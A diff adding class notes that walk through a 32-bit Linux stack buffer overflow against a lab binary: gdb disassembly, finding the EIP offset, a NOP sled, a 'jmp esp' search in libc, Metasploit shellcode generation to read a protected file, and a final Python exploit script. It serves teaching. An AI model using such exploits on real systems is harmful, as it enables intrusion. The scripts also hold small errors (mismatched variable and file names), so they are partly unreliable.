@@ -2101,3 +2101,236 @@ buf += b"\x9f\xb1\x90\xe8\x41\xf0\x97"
 print(buffer+eip+nop+buf)
 
 ```
+
+
+
+## ACOSTA CLASS DEMO
+
+Demo for initial analysis with gdb:
+```
+root@linux-opstation-pkbk:/demo# gdb func
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+
+disass main
+Dump of assembler code for function main:
+   0x000005c0 <+0>:	lea    ecx,[esp+0x4]
+   0x000005c4 <+4>:	and    esp,0xfffffff0
+   0x000005c7 <+7>:	push   DWORD PTR [ecx-0x4]
+   0x000005ca <+10>:	push   ebp
+   0x000005cb <+11>:	mov    ebp,esp
+   0x000005cd <+13>:	push   ecx
+   0x000005ce <+14>:	sub    esp,0x4
+   0x000005d1 <+17>:	call   0x623 <__x86.get_pc_thunk.ax>
+   0x000005d6 <+22>:	add    eax,0x1a2a
+   0x000005db <+27>:	call   0x5ea <getuserinput>
+   0x000005e0 <+32>:	nop
+   0x000005e1 <+33>:	add    esp,0x4
+   0x000005e4 <+36>:	pop    ecx
+   0x000005e5 <+37>:	pop    ebp
+   0x000005e6 <+38>:	lea    esp,[ecx-0x4]
+   0x000005e9 <+41>:	ret
+End of assembler dump.
+
+disass getuserinput
+Dump of assembler code for function getuserinput:
+   0x000005ea <+0>:	push   ebp
+   0x000005eb <+1>:	mov    ebp,esp
+   0x000005ed <+3>:	push   ebx
+   0x000005ee <+4>:	sub    esp,0x44
+   0x000005f1 <+7>:	call   0x490 <__x86.get_pc_thunk.bx>
+   0x000005f6 <+12>:	add    ebx,0x1a0a
+   0x000005fc <+18>:	sub    esp,0xc
+   0x000005ff <+21>:	lea    eax,[ebx-0x1950]
+   0x00000605 <+27>:	push   eax
+   0x00000606 <+28>:	call   0x420 <puts@plt>
+   0x0000060b <+33>:	add    esp,0x10
+   0x0000060e <+36>:	sub    esp,0xc
+   0x00000611 <+39>:	lea    eax,[ebp-0x3a]
+   0x00000614 <+42>:	push   eax
+   0x00000615 <+43>:	call   0x410 <gets@plt>
+   0x0000061a <+48>:	add    esp,0x10
+   0x0000061d <+51>:	nop
+   0x0000061e <+52>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x00000621 <+55>:	leave
+   0x00000622 <+56>:	ret
+End of assembler dump.
+```
+Next, continue slowly adding A’s onto your input until you seg fault again.
+```
+run
+Starting program: /demo/func
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+```
+Now that you have the buffer that seg faults, add 4 B’s to the end. This should completely overwrite the $eip with the hex value of B which is 42. If it does not, then add or remove A’s until it does.
+```
+run
+Starting program: /demo/func
+Enter a string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+[2J[H[----------------------------------registers-----------------------------------]
+[mEAX: 0xffffeddf
+EBX: 0x1
+ECX: 0xfbad2288
+EDX: 0x0
+ESI: 0x1
+EDI: 0xf7fb8000 --> 0x1b3db0
+EIP: 0x42424242 ('BBBB')
+```
+We can now take this input string and begin crafting our exploit code.
+
+
+/buff.py
+```
+buffer = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+EIP = "BBBB"
+
+nop = '\x90' * 5
+
+print(buffer + eip + nop)
+```
+We added a nop sled here so that when the program crashes next time, we can look on the stack and ensure that our 5 nop’s were added.
+
+Let’s run this in gdb to test it out.
+```
+run <<< $(python demo_attack.py)
+Starting program: /demo/func <<< $(python /tmp/exploit.py)
+Enter a string:
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+[mEAX: 0xffffdbbe ('A' <repeats 58 times>, "\374\333\377\377\220\220\220\220\220\220\220\220\220\220")
+EBX: 0x41414141 ('AAAA')
+ECX: 0xfbad2088
+EDX: 0xf7fb987c --> 0x0
+ESI: 0x1
+EDI: 0xf7fb8000 --> 0x1b3db0
+EBP: 0xffffdbfc --> 0x90909090
+ESP: 0xffffdc00 --> 0x90909090
+EIP: 0x90909090
+[mEFLAGS: 0x10282 (carry parity adjust zero 1;31mSIGN trap 1;31mINTERRUPT direction overflow)
+[m[-------------------------------------code-------------------------------------]
+31mInvalid $PC address: 0x90909090
+[m[------------------------------------stack-------------------------------------]
+[m0000| 0xffffdc00 --> 0x90909090
+```
+We redirected the output of our exploit.py into the target binary, received a seg fault, and successfully placed our NOPs on the stack. We must now find a way to get back to the top of the stack where our nop sled and eventual shell code will be sitting.
+
+
+Our tactic will be to find "jmp esp".
+
+Get back into gdb, but this time we will be using "env" to create an environment the same as our execution environment. That means that we will have the same memory addresses and offsets in gdb as when our binary executes. To do so:
+```
+root@linux# env - gdb func
+```
+GDB will still add two variables that we need to unset.
+```
+show env
+env LINES = 12
+env COLUMNS = 10
+
+unset env LINES
+unset env COLUMNS
+
+show env
+```
+Once program has crashed or stopped running run the following command:
+```
+info proc map
+```
+This will return a massive range of potential memory addresses to search through.
+
+Mapped address spaces:
+```
+	Start Addr   End Addr       Size     Offset objfile
+	0x56555000 0x56556000     0x1000        0x0 /home/student/func
+	0x56556000 0x56557000     0x1000        0x0 /home/student/func
+	0x56557000 0x56558000     0x1000     0x1000 /home/student/func
+	0x56558000 0x5657a000    0x22000        0x0 [heap]
+	0xf7de2000 0xf7fb4000   0x1d2000        0x0 /lib32/libc-2.27.so            # First one under heap
+	0xf7fb4000 0xf7fb5000     0x1000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb5000 0xf7fb7000     0x2000   0x1d2000 /lib32/libc-2.27.so
+	0xf7fb7000 0xf7fb8000     0x1000   0x1d4000 /lib32/libc-2.27.so
+	0xf7fb8000 0xf7fbb000     0x3000        0x0
+	0xf7fcf000 0xf7fd1000     0x2000        0x0
+	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
+	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
+	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]                       # First on one stack
+```
+To search for "jmp esp" run the command:
+```
+find /b 0xf7de2000 , 0xf7ffe000, 0xff, 0xe4
+```
+msfvenom CMD
+```
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+```
+msfconsole CMD
+
+Let’s select a payload for a proof of concept. We are exploiting an x86 32 bit program on a Linux machine. "Linux/x86/exec" should execute whatever we want.
+```
+use payload/linux/x86/exec
+```
+"show options" will allow us to view what we can set.
+```
+show options
+Module options (payload/linux/x86/exec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   CMD                    yes       The command string to execute
+```
+linux/x86/exec only takes a CMD option that is the command you want to run. Let’s set that to 'cat users' since that is a protected file in the same directory as the binary.
+```
+set CMD cat users
+
+generate -b "\x00" -f python
+# linux/x86/exec - 72 bytes
+# https://metasploit.com/
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, PrependFork=false, PrependSetresuid=false,
+# PrependSetreuid=false, PrependSetuid=false,
+# PrependSetresgid=false, PrependSetregid=false,
+# PrependSetgid=false, PrependChrootBreak=false,
+# AppendExit=false, MeterpreterDebugLevel=0,
+# RemoteMeterpreterDebugFile=, CMD=cat users
+buf =  b""
+buf += b"\xba\xaa\x14\x57\xbb\xdb\xc7\xd9\x74\x24\xf4\x5e\x2b"
+buf += b"\xc9\xb1\x0c\x83\xc6\x04\x31\x56\x0f\x03\x56\xa5\xf6"
+buf += b"\xa2\xd1\xb2\xae\xd5\x74\xa2\x26\xcb\x1b\xa3\x50\x7b"
+buf += b"\xf3\xc0\xf6\x7c\x63\x09\x65\x14\x1d\xdc\x8a\xb4\x09"
+buf += b"\xd4\x4c\x39\xca\x8b\x2d\x4d\xea\x3e\xdd\xc8\x98\xb3"
+buf += b"\x21\x44\x0e\xba\xc3\xa7\x30"
+```
+Code
+```
+  1 #!/usr/bin/env python
+  2 
+  3 buffer = "A" * 62
+  4 eip = "\x59\xeb\xde\xf7"
+  5 nop = "\x90" * 15
+  6 buf =  b""
+  7 buf += b"\xb8\xfb\x3d\xe0\xdc\xd9\xee\xd9\x74\x24\xf4\x5a"
+  8 buf += b"\x2b\xc9\xb1\x0b\x83\xc2\x04\x31\x42\x10\x03\x42"
+  9 buf += b"\x10\x19\xc8\x8a\xd7\x85\xaa\x19\x8e\x5d\xe0\xfe"
+ 10 buf += b"\xc7\x7a\x92\x2f\xab\xec\x63\x58\x64\x8e\x0a\xf6"
+ 11 buf += b"\xf3\xad\x9f\xee\x03\x31\x20\xef\x7c\x59\x4f\x8e"
+ 12 buf += b"\xef\xf0\x8f\x07\xa3\x8b\x71\x6a\xc3"
+ 13 
+ 14 # find /b 0xf7de1000,0xfffdd000, 0xff, 0xe4
+ 15 # 0xf7de3b59 -> 0xf7 de eb 59 "\x59\xeb\xde\xf7"
+ 16 # 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
+ 17 # 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
+ 18 # 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"
+ 19 
+ 20 
+ 21 print(buffer+eip+nop+buff)
+```
